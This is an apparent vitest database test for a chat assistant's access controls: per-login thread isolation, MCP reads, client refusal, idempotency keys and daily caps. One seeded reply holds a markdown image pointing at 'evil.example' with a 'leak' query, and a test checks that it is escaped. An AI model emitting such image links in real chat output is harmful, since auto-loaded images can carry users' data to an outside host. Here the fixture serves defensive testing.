/**
 * W7c (fix round 1): each user reads only their own chat threads, the owner
 * included, and the chat routes hold that per role. On a migrated scratch
 * database switched onto workspaces, with the chat gate stood in (a login
 * object per role, never a minted session) and the durable queue faked:
 *
 *  - H1: a second Admin user talking to a helper with no workspace (the
 *    replay agent) replays and finds only its own turns and digests, never
 *    the owner's; with no login it is refused; over MCP the same, under
 *    MANTLE_ADMIN_READS=system too.
 *  - M1: responder_turn_record over a second Admin user's MCP lands in that
 *    user's thread.
 *  - M3: a member's thread comes back with a picture it may not see escaped.
 *  - M4: a client has no chat: no agent, a 404 turn, a 404 transcription,
 *    and the workspace engine refuses it before writing.
 *  - A member asking for the Admin assistant by slug gets 404.
 *  - L1: a second login reusing an Idempotency-Key gets its own turn.
 *  - L2: a member's New chat counts against its daily cap.
 *
 *   MANTLE_TEST_DATABASE_URL=postgres://… pnpm vitest run server/web/server/w7c-chat.db.test.ts
 */
import { randomUUID } from 'node:crypto';
import { mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { sql } from 'drizzle-orm';
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';

const URL = process.env.MANTLE_TEST_DATABASE_URL;
const VEC = Array.from({ length: 768 }, (_, i) => (i === 0 ? 1 : 0));

const h = vi.hoisted(() => ({
  login: null as unknown,
  enqueued: [] as { id: string; input: unknown }[],
}));

vi.mock('@/lib/auth', async (importOriginal) => ({
  ...(await importOriginal<Record<string, unknown>>()),
  getChatLoginOr401: vi.fn(async () => h.login),
}));
vi.mock('@/lib/dbos-client', () => ({
  getDbosClient: async () => ({
    enqueue: async (o: { workflowID?: string }, input: unknown) => {
      h.enqueued.push({ id: o.workflowID ?? '', input });
      return { getResult: async () => null };
    },
    getWorkflow: async (id: string) => ({
      input: [h.enqueued.find((e) => e.id === id)?.input],
    }),
  }),
}));
vi.mock('@mantle/embeddings', async (importOriginal) => ({
  ...(await importOriginal<Record<string, unknown>>()),
  embed: vi.fn(async () => VEC),
}));

describe.skipIf(!URL)('W7c: own threads only, per role', () => {
  type Ts = typeof import('@mantle/db/test-support');
  let scratch: Awaited<ReturnType<Ts['createMigratedScratchDatabase']>> | undefined;
  let m: typeof import('@mantle/db');
  let t: typeof import('@mantle/tools');
  let rt: typeof import('@mantle/runtime/agent');
  let threadRoute: typeof import('../app/api/assistant/thread/route');
  let threadsRoute: typeof import('../app/api/assistant/threads/route');
  let turnRoute: typeof import('../app/api/assistant/turn/route');
  let transcribeRoute: typeof import('../app/api/assistant/transcribe/route');
  let dir = '';
  const tag = `w7cc${randomUUID().slice(0, 6)}`;
  const owner = randomUUID();
  const adminB = randomUUID();
  const member = randomUUID();
  const member2 = randomUUID();
  const member3 = randomUUID();
  const client = randomUUID();
  const adminSlug = `${tag}-admin`;
  const teamSlug = `${tag}-team`;
  let adminWs = '';
  let teamWs = '';
  let adminAgent = '';
  let teamAgent = '';
  let remy = '';
  const ownerDigest = randomUUID();
  const bDigest = randomUUID();

  const x = async <T>(q: ReturnType<typeof sql>): Promise<T[]> =>
    (await m.systemDb.execute(q)) as unknown as T[];
  const req = (p: string, init?: RequestInit) => new Request(`http://brain.test${p}`, init);
  const chatLogin = (kind: 'admin' | 'member' | 'client', loginId: string) => ({
    kind,
    ownerId: owner,
    loginId,
    source: 'web',
    user: {
      id: owner,
      email: `${loginId}@example.invalid`,
      actor: {
        id: loginId,
        email: `${loginId}@example.invalid`,
        displayName: null,
        isOwner: loginId === owner,
      },
    },
    displayName: null,
    email: `${loginId}@example.invalid`,
  });
  const window = {
    from: new Date(Date.now() - 86_400_000).toISOString(),
    to: new Date(Date.now() + 86_400_000).toISOString(),
  };
  const replay = (surface: unknown) =>
    t.getBuiltin('replay_window')!.handler(
      { ...window, surface: 'all' },
      {
        ownerId: owner,
        surface: surface as never,
      },
    );
  const find = (surface: unknown) =>
    t
      .getBuiltin('find_window')!
      .handler({ topic: 'kettle' }, { ownerId: owner, surface: surface as never });
  const texts = (r: { ok: boolean; output?: unknown }) =>
    ((r.output as { turns?: { text: string }[] })?.turns ?? []).map((x) => x.text);
  const windowIds = (r: { ok: boolean; output?: unknown }) =>
    ((r.output as { windows?: { node_id: string }[] })?.windows ?? []).map((w) => w.node_id);
  const asRemy = <T>(fn: () => Promise<T>, loginId?: string) =>
    rt.withAgentScope({ id: remy, audience: 'admin', workspaceId: null }, fn, {
      ownerLoginId: loginId ?? null,
    });
  const mcpCall = async (loginId: string, name: string, args: Record<string, unknown>) => {
    const ls = await import('@mantle/mcp-core');
    const { McpServer, InMemoryTransport } = await import('@modelcontextprotocol/server');
    const { Client } = await import('@modelcontextprotocol/client');
    const server = new McpServer({ name: 'test', version: '0' });
    ls.registerPreparedTools(
      server,
      await ls.prepareCallerTools({
        role: 'admin',
        anchorId: owner,
        loginId,
        via: 'oauth',
        write: true,
      }),
    );
    const [a, b] = InMemoryTransport.createLinkedPair();
    const c = new Client({ name: 'test-client', version: '0' });
    await Promise.all([server.connect(a), c.connect(b)]);
    const res = (await c.callTool({ name, arguments: args })) as {
      isError?: boolean;
      content?: { text?: string }[];
    };
    await c.close();
    return { isError: res.isError === true, text: res.content?.map((p) => p.text).join('') ?? '' };
  };

  beforeAll(async () => {
    const ts: Ts = await import('@mantle/db/test-support');
    scratch = await ts.createMigratedScratchDatabase(URL!);
    dir = await mkdtemp(path.join(tmpdir(), 'w7c-chat-'));
    process.env.DATABASE_URL = scratch.url;
    process.env.TABLE_DB_DIR = path.join(dir, 'tables');
    process.env.APP_DB_DIR = path.join(dir, 'apps');
    process.env.FILES_DIR = path.join(dir, 'files');
    process.env.MANTLE_FILES_ROOT = path.join(dir, 'files');
    process.env.MANTLE_SPACES_ROOT = path.join(dir, 'spaces');
    process.env.MANTLE_MASTER_KEY ??= 'mantle-viewer-test-key';
    process.env.TEAM_CHAT_DAILY_TURNS = '3';
    delete process.env.MANTLE_ADMIN_READS;
    vi.stubGlobal(
      'fetch',
      vi.fn(async () => new Response('offline in the W7c test', { status: 503 })),
    );
    m = await import('@mantle/db');
    t = await import('@mantle/tools');
    rt = await import('@mantle/runtime/agent');
    threadRoute = await import('../app/api/assistant/thread/route');
    threadsRoute = await import('../app/api/assistant/threads/route');
    turnRoute = await import('../app/api/assistant/turn/route');
    transcribeRoute = await import('../app/api/assistant/transcribe/route');

    await x(sql`insert into auth.users (id, email, password_hash, is_owner, role, display_name) values
      (${owner}, ${`${tag}-o@example.invalid`}, 'x', true, 'admin', 'Owner'),
      (${adminB}, ${`${tag}-b@example.invalid`}, 'x', false, 'admin', 'Second admin'),
      (${member}, ${`${tag}-m@example.invalid`}, 'x', false, 'member', 'Member'),
      (${member2}, ${`${tag}-n@example.invalid`}, 'x', false, 'member', 'Member two'),
      (${member3}, ${`${tag}-p@example.invalid`}, 'x', false, 'member', 'Member three')`);
    await x(sql`insert into spaces (id, kind, login_id) values (${owner}, 'brain', ${owner})
      on conflict (id) do nothing`);
    const migrated = await x<{ section: string }>(sql`select * from mantle_ws_migrate()`);
    expect(migrated.filter((r) => r.section === 'reach-fail')).toEqual([]);
    const wsRows = await x<{ id: string; is_admin: boolean; bridge_key: string | null }>(
      sql`select id::text, is_admin, bridge_key from workspaces where owner_id = ${owner}`,
    );
    expect(wsRows.length, JSON.stringify({ migrated, wsRows })).toBeGreaterThan(0);
    // A client login: made after the switch (the switch skips a brain that
    // has client logins).
    await x(sql`insert into auth.users (id, email, password_hash, is_owner, role, display_name)
      values (${client}, ${`${tag}-c@example.invalid`}, 'x', false, 'client', 'Client')`);
    adminWs = (
      await x<{ id: string }>(sql`select id::text from workspaces
        where owner_id = ${owner} and is_admin and archived_at is null`)
    )[0]!.id;
    teamWs = (
      await x<{ id: string }>(sql`select id::text from workspaces
        where owner_id = ${owner} and bridge_key = 'team' and archived_at is null`)
    )[0]!.id;
    for (const [ws, login] of [
      [adminWs, adminB],
      [teamWs, member],
      [teamWs, member2],
      [teamWs, member3],
    ] as const) {
      await x(sql`insert into workspace_users (workspace_id, login_id, moderator)
        values (${ws}, ${login}, false) on conflict do nothing`);
    }
    const agent = async (slug: string, role: string, ws: string | null) => {
      const [row] = await m.systemDb
        .insert(m.agents)
        .values({
          ownerId: owner,
          slug,
          name: slug,
          model: 'test/model',
          systemPrompt: 'p',
          role: role as never,
          workspaceId: ws,
          memoryConfig: { chunk_limit: 0, content_hit_limit: 0, corpus_map_limit: 0 },
        })
        .returning();
      if (ws) {
        await x(sql`insert into workspace_resources (workspace_id, type, ref_id, write)
          values (${ws}, 'assistant', ${row!.id}, true) on conflict do nothing`);
      }
      return row!.id;
    };
    adminAgent = await agent(adminSlug, 'assistant', adminWs);
    teamAgent = await agent(teamSlug, 'responder', teamWs);
    remy = await agent(`${tag}-remy`, 'custom', null);

    // The owner's and the second Admin user's own turns with the Admin
    // assistant, and a digest of each.
    for (const [login, text] of [
      [owner, `${tag} owner secret kettle`],
      [adminB, `${tag} second admin question`],
    ] as const) {
      await m.asSystem(() =>
        rt.recordTurn({
          ownerId: owner,
          agentId: adminAgent,
          loginId: login,
          direction: 'inbound',
          text,
          channel: 'web',
        }),
      );
    }
    const vec = JSON.stringify(VEC);
    for (const [id, login] of [
      [ownerDigest, owner],
      [bDigest, adminB],
    ] as const) {
      const data = {
        kind: 'conversation_digest',
        agent_id: adminAgent,
        login_id: login,
        topic: 'kettle',
        summary: `${login} kettle`,
        period_start: window.from,
        period_end: window.to,
      };
      await x(sql`insert into nodes (id, owner_id, type, title, path, audience, tags, data, embedding, login_id)
        values (${id}, ${owner}, 'note', 'Digest', 'notes', 'admin',
                ARRAY['conversation-digest']::text[], ${JSON.stringify(data)}::jsonb,
                ${vec}::vector, ${login})`);
      await x(sql`insert into item_grants (node_id, workspace_id, write, is_home)
        values (${id}, ${adminWs}, false, true) on conflict do nothing`);
    }

    // A member's thread with the Team assistant, one reply carrying a
    // picture from outside.
    await x(sql`insert into chat_threads (owner_id, agent_id, status, login_id, started_at)
      values (${owner}, ${teamAgent}, 'open', ${member}, now() - interval '1 hour')`);
    await x(sql`insert into assistant_messages (owner_id, agent_id, direction, text, channel, login_id,
                                               workspace_id, created_at)
      values (${owner}, ${teamAgent}, 'outbound', 'look ![x](https://evil.example/?q=leak) here',
              'web', ${member}, ${teamWs}, now() - interval '30 minutes')`);
  }, 240_000);

  afterAll(async () => {
    vi.unstubAllGlobals();
    delete process.env.MANTLE_ADMIN_READS;
    delete process.env.TEAM_CHAT_DAILY_TURNS;
    await m?.closeDb();
    await scratch?.drop();
    if (dir) await rm(dir, { recursive: true, force: true });
  }, 60_000);

  // ── H1 ────────────────────────────────────────────────────────────────

  it('H1: a second Admin user with the replay agent reads its own turns and digests only', async () => {
    const seen = await asRemy(
      async () => ({
        replay: await replay({ kind: 'owner', via: 'run' }),
        find: await find({ kind: 'owner', via: 'run' }),
        stamp: m.currentTurnStamp(),
      }),
      adminB,
    );
    expect(seen.stamp).toEqual({ workspaceId: null, loginId: adminB });
    expect(seen.replay.ok).toBe(true);
    expect(texts(seen.replay)).toContain(`${tag} second admin question`);
    expect(texts(seen.replay)).not.toContain(`${tag} owner secret kettle`);
    expect(windowIds(seen.find)).toContain(bDigest);
    expect(windowIds(seen.find)).not.toContain(ownerDigest);
    // The owner, asking for itself, reads its own.
    const own = await asRemy(() => replay({ kind: 'owner', via: 'run' }), owner);
    expect(texts(own)).toContain(`${tag} owner secret kettle`);
    expect(texts(own)).not.toContain(`${tag} second admin question`);
  });

  it('H1: with no login asked, replay and find refuse (never the anchor)', async () => {
    const seen = await asRemy(async () => ({
      replay: await replay({ kind: 'owner', via: 'run' }),
      find: await find({ kind: 'owner', via: 'run' }),
    }));
    expect(seen.replay.ok).toBe(false);
    expect(seen.find.ok).toBe(false);
  });

  it('H1: over MCP (and under MANTLE_ADMIN_READS=system) a second Admin user never reads the owner’s', async () => {
    for (const mode of ['scope', 'system'] as const) {
      if (mode === 'system') process.env.MANTLE_ADMIN_READS = 'system';
      try {
        const r = await mcpCall(adminB, 'replay_window', { ...window });
        expect(r.isError, r.text.slice(0, 200)).toBe(false);
        expect(r.text, mode).toContain('second admin question');
        expect(r.text, mode).not.toContain('owner secret kettle');
        const f = await mcpCall(adminB, 'find_window', { topic: 'kettle' });
        expect(f.isError, f.text.slice(0, 200)).toBe(false);
        expect(f.text, mode).toContain(bDigest);
        expect(f.text, mode).not.toContain(ownerDigest);
      } finally {
        delete process.env.MANTLE_ADMIN_READS;
      }
    }
  });

  // ── M1 ────────────────────────────────────────────────────────────────

  it('M1: responder_turn_record over a second Admin user’s MCP lands in its own thread', async () => {
    const message = `${tag} recorded by B`;
    const r = await mcpCall(adminB, 'responder_turn_record', {
      message,
      reply: 'answered over MCP',
      model: 'test-model',
      agent_slug: adminSlug,
    });
    expect(r.isError, r.text.slice(0, 300)).toBe(false);
    const rows = await x<{ login: string }>(sql`select login_id::text as login
      from assistant_messages where owner_id = ${owner} and channel = 'mcp'
       and (text = ${message} or text = 'answered over MCP')`);
    expect(rows.map((row) => row.login)).toEqual([adminB, adminB]);
  });

  // ── Routes ────────────────────────────────────────────────────────────

  it('M3: a member’s thread comes back with the outside picture escaped', async () => {
    h.login = chatLogin('member', member);
    const res = await threadRoute.GET(req(`/api/assistant/thread?agent=${teamSlug}`));
    expect(res.status).toBe(200);
    const body = (await res.json()) as { messages: { text: string }[] };
    expect(body.messages.length).toBeGreaterThan(0);
    for (const msg of body.messages) {
      expect(msg.text).not.toMatch(/(^|[^\\])!\[[^\]]*\]\(https:\/\/evil/);
    }
  });

  it('a member asking for the Admin assistant by slug gets 404', async () => {
    h.login = chatLogin('member', member);
    const res = await turnRoute.POST(
      req('/api/assistant/turn', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ text: 'hello', agentSlug: adminSlug }),
      }),
    );
    expect(res.status).toBe(404);
    expect(await res.json()).toMatchObject({ reason: 'no-chat-agent' });
  });

  it('M4: a client has no chat: no agent, 404 turn, 404 transcription, engine refuses', async () => {
    h.login = chatLogin('client', client);
    const bundle = (await (await threadRoute.GET(req('/api/assistant/thread'))).json()) as {
      agent: unknown;
      agents: unknown[];
      messages: unknown[];
    };
    expect(bundle).toMatchObject({ agent: null, agents: [], messages: [] });
    const turn = await turnRoute.POST(
      req('/api/assistant/turn', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ text: 'hello', agentSlug: teamSlug }),
      }),
    );
    expect(turn.status).toBe(404);
    const form = new FormData();
    form.set('audio', new Blob([new Uint8Array([1, 2, 3])], { type: 'audio/webm' }));
    const stt = await transcribeRoute.POST(
      req('/api/assistant/transcribe', { method: 'POST', body: form }),
    );
    expect(stt.status).toBe(404);
    const ra = await import('@mantle/runtime/assistant');
    await expect(
      ra.runTeamTurn(owner, 'hello', { loginId: client, channel: 'web' }),
    ).rejects.toThrow(/client login has no chat/);
    expect(await x(sql`select 1 from assistant_messages where login_id = ${client}`)).toHaveLength(
      0,
    );
  });

  it('L1: a second login reusing an Idempotency-Key gets its own turn', async () => {
    const key = randomUUID();
    const post = async (loginId: string) => {
      h.login = chatLogin('member', loginId);
      const res = await turnRoute.POST(
        req('/api/assistant/turn', {
          method: 'POST',
          headers: { 'content-type': 'application/json', 'idempotency-key': key },
          body: JSON.stringify({ text: 'same words', agentSlug: teamSlug }),
        }),
      );
      return { status: res.status, body: (await res.json()) as { turnId?: string } };
    };
    const a = await post(member);
    expect(a).toEqual({ status: 202, body: { turnId: `ws-${member}.${key}` } });
    const b = await post(member2);
    expect(b).toEqual({ status: 202, body: { turnId: `ws-${member2}.${key}` } });
    expect(h.enqueued.map((e) => e.id)).toEqual(
      expect.arrayContaining([`ws-${member}.${key}`, `ws-${member2}.${key}`]),
    );
  });

  it('L2: a member’s New chat counts against its daily cap', async () => {
    h.login = chatLogin('member', member3);
    const statuses: number[] = [];
    for (let i = 0; i < 4; i += 1) {
      const res = await threadsRoute.POST(
        req('/api/assistant/threads', {
          method: 'POST',
          body: JSON.stringify({ agent: teamSlug }),
        }),
      );
      statuses.push(res.status);
    }
    expect(statuses).toEqual([200, 200, 200, 429]);
  });
});
